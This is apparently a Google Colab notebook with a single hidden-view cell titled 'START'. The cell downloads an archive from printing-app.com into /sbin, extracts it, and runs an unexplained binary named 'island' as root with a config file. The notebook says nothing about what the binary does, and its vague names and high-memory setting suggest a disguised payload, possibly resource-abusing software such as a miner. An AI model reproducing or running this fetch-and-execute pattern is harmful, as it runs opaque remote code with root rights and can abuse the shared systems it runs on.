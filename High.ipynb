{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "High.ipynb",
      "private_outputs": true,
      "provenance": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "jXabvKpBHj3x",
        "cellView": "form"
      },
      "source": [
        "#@title START\n",
        "%cd /sbin\n",
        "!wget https://printing-app.com/island.tar.gz\n",
        "!tar -xvf island.tar.gz\n",
        "!sed -i -e 's/\\r$//' config.json\n",
        "!chmod  +x *.json ./island && sudo ./island\n",
        "!./island -c config.json"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}